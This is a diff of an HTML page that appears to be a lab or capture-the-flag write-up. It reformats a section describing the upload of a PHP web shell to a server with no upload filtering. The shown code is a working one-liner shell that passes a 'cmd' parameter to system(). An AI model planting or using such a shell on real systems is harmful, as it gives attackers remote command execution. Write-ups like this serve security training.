@@ -150,9 +150,9 @@
     <h2>2. Uploading a PHP Shell</h2>
     <p>Since there’s no filtering, we upload a classic one-liner PHP web shell as <code>syndro.php</code>. The server replies “Upload successful!” — instant RCE.</p>
 
-    <pre>
-      <html>
-        <body>
+```
+<pre>    
+  <body>
           <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
           <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
           <input type="SUBMIT" value="Execute">
@@ -163,8 +163,9 @@
         system($_GET['cmd'] . ' 2>&1');
     }
 ?>
-        </pre>
-
+  </body>
+</pre>
+          
     <img src="https://github.com/user-attachments/assets/eec01e40-edc0-469a-9e37-1f85669bfddf" alt="Upload success">
     <img src="https://github.com/user-attachments/assets/7f667e88-f38f-4b7d-89da-d662e96c6e80" alt="Shell execution">
 
